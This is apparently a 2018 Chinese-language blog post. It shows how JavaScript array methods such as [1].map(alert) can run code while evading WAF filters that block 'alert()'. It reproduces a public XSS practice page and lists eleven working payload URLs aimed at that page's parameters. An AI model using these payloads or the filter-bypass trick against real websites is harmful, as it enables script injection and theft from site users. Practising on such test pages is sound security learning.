---
layout: post
author: "kele"
title: "使用 javascript数组方法进行xss攻击"
date: "2018-2-21"
tags: 
  - xss
---
# 使用数组方法进行xss 攻击   

[原文地址](https://twitter.com/brutelogic/status/965642032424407040)  

```
JS Execution 
Array Methods

[1].map(alert)
[1].find(alert)
[1].every(alert)
[1].filter(alert)
[1].findIndex(alert)
```

主要是不适用`alert()`,感觉有点蛋疼，因为一般waf都是过滤alert，所以我还是试了一下     

作者给了一个简单的测试页面  http://brutelogic.com.br/xss.php   

一共11各变量用来输入，进行xss攻击   

```
<!DOCTYPE html>
<head>
<!-- XSS in 11 URL parameters (a, b1, b2, b3, b4, c1, c2, c3, c4, c5 and c6) + URL itself -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>XSS Test Page by Brute Logic</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
</head>
<body>
<h1>XSS Test</h1>
by <a href="https://twitter.com/brutelogic">@brutelogic</a>
<br><br>
<!-- Simple HTMLi -->
Hello, guest!
<br>
<br>
<br>
Find user profile providing one or more below: 
<!-- URL Reflection -->
<form action="/xss.php" method="POST">
<br>
User
<br>
<!-- Inline HTMLi (Double Quotes) -->
<input type="text" name="b1" value="">
<br>
<br>
Email
<br>
<!-- Inline HTMLi (Single Quotes) -->
<input type="text" name="b2" value=''>
<br>
<br>
Name
<br>
<!-- Inline HTMLi - No Tag Breaking (Double Quotes) -->
<input type="text" name="b3" value="">
<br>
<br>
Group
<br>
<!-- Inline HTMLi - No Tag Breaking (Single Quotes) -->
<input type="text" name="b4" value=''>
<br>
<br>
<input type="submit" id="i" value="Find">
</form>
<script>
	// HTMLi in Js Block (Single Quotes)
	var c1 = '-alert(1)//';

	// HTMLi in Js Block (Double Quotes)
	var c2 = "value2";

	// Simple Js Injection (Single Quotes)
	var c3 = 'value3';

	// Simple Js Injection (Double Quotes)
	var c4 = "value4";

	// Escaped Js Injection (Single Quotes)
	var c5 = 'value5';

	// Escaped Js Injection (Double Quotes)
	var c6 = "value6";

</script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/less.js/2.7.1/less.min.js"></script> -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<script src=/x.js></script>
</body>
</html>
```


payload:  
emmmmmm我的payload可以用firefox通过，chrome有防止xss的功能    
1. `http://brutelogic.com.br/xss.php?a=<svg onload=[1].map(alert)>`
1. `http://brutelogic.com.br/xss.php?b1="><svg onload=[1].map(alert)>`
1. `http://brutelogic.com.br/xss.php?b2='><svg onload=[1].map(alert)>`
1. `http://brutelogic.com.br/xss.php?b3=" onmouseover=[1].map(alert)//`
1. `http://brutelogic.com.br/xss.php?b4=' onmouseover=[1].map(alert)//`
1. `http://brutelogic.com.br/xss.php?c1=</script><svg onload=[1].map(alert)>`
1. `http://brutelogic.com.br/xss.php?c2=</script><svg onload=[1].map(alert)>`
1. `http://brutelogic.com.br/xss.php?c3='-[1].map(alert)-'`
1. `http://brutelogic.com.br/xss.php?c4="-[1].map(alert)-"`
1. `http://brutelogic.com.br/xss.php?c5=\'-[1].map(alert)//`
1. `http://brutelogic.com.br/xss.php?c6=\"-[1].map(alert)//` 

emmmm c1和c2的payload 我用的是一样的，可能有点问题？后面有后续报道再说吧。。。